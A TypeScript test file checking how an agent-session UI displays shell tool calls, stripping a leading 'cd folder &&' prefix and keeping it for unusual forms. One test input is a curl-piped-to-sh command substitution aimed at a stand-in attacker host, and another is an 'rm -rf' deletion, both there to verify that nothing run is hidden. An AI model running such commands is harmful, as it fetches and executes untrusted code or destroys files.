// A shell call's leading `cd <folder> &&` is setup, not what it ran (Leo 2026-10-13, transcript row
// design, #20456): the row reads "Ran git fetch …" without it, the opened Shell block names the
// folder by its last part beside its label, and Find counts the command as the rows draw it. A cd
// that names no plain folder (`cd ..`, `cd ~`, `cd "$(…)"`) keeps its prefix, so nothing the call ran is hidden.
import { afterAll, beforeAll, expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import { act } from "react";
import type { Root } from "react-dom/client";

const scope = globalThis as Record<string, unknown>;
const keys = ["window", "document", "navigator", "HTMLElement", "customElements", "IS_REACT_ACT_ENVIRONMENT"] as const;
const saved = keys.map((key) => [key, key in scope, scope[key]] as const);
let root: Root | undefined;
let host: HTMLElement;

beforeAll(() => {
  const { window } = new JSDOM("<!doctype html><div id=root></div>");
  Object.assign(scope, {
    window,
    document: window.document,
    navigator: window.navigator,
    HTMLElement: window.HTMLElement,
    customElements: window.customElements,
    IS_REACT_ACT_ENVIRONMENT: true,
  });
  host = window.document.querySelector<HTMLElement>("#root")!;
});

afterAll(() => {
  act(() => root?.unmount());
  for (const [key, had, value] of saved) {
    if (had) scope[key] = value;
    else delete scope[key];
  }
});

async function render(items: object[]) {
  const { createRoot } = await import("react-dom/client");
  const { ToolRows } = await import("../src/agent-session/acpmux/conversation/TurnRows");
  act(() => root?.unmount());
  root = createRoot(host);
  await act(async () =>
    root!.render(<ToolRows row={{ id: "activity-1", kind: "activity", at: 1, settled: false, items } as never} />),
  );
}

const FETCH = "cd ~/wt/lanes/cg-next-reds && git fetch -q origin feat-cmux-next && git diff HEAD~1 --stat";
const REST = "git fetch -q origin feat-cmux-next && git diff HEAD~1 --stat";
const shell = (id: string, command: string) => ({
  kind: "tool",
  text: "Run",
  tool: { id, title: "Run", kind: "execute", status: "completed", command, output: " a | 2 +-\n" },
});

test("a shell call reads without its leading cd, and opens to its folder and command", async () => {
  await render([shell("t1", FETCH)]);
  const row = host.querySelector<HTMLButtonElement>(".cv-tool")!;
  expect(row.querySelector(".cv-tool__text")?.textContent).toBe(`Ran ${REST}`);
  await act(async () => row.click());
  expect(host.querySelector(".cv-shell__folder")?.textContent).toBe("cg-next-reds");
  expect(host.querySelector(".cv-shell__command")?.textContent).toBe(`$ ${REST}`);
});

test("a group's command rows drop the leading cd too", async () => {
  await render([shell("t1", FETCH), shell("t2", "cd ~/wt/lanes/x && ls build")]);
  const lines = [...host.querySelectorAll(".cv-command__line")].map((line) => line.textContent);
  expect(lines).toEqual([REST, "ls build"]);
});

test("a cd that names no plain folder, or could run code, keeps its prefix", async () => {
  const { commandFolder } = await import("../src/agent-session/acpmux/conversation/commandFolder");
  for (const command of [
    "cd .. && rm -rf build",
    "cd ~ && ls",
    "cd - && ls",
    "ls",
    "cd x; ls",
    "cd x && ",
    'cd "$(curl http://e.vil/a|sh)" && ls',
    "cd `pwd`/x && ls",
    "cd $HOME/x && ls",
  ])
    expect(commandFolder(command)).toEqual({ rest: command });
  expect(commandFolder("cd ~/wt/lanes/x && ls")).toEqual({ folder: "x", rest: "ls" });
  expect(commandFolder('cd "/tmp/my dir/" && cd sub && make')).toEqual({ folder: "sub", rest: "make" });
});

test("Find counts a command as its rows draw it, without the leading cd", async () => {
  const { findMatches } = await import("../src/agent-session/acpmux/conversation/chatFind");
  const row = {
    id: "activity-find",
    kind: "activity",
    version: 1,
    at: 1,
    items: [shell("t10", "cd ~/wt/lanes/x && ls build")],
  };
  expect(findMatches([row as never], "lanes")).toEqual([]);
  expect(findMatches([row as never], "build")).toHaveLength(1);
});
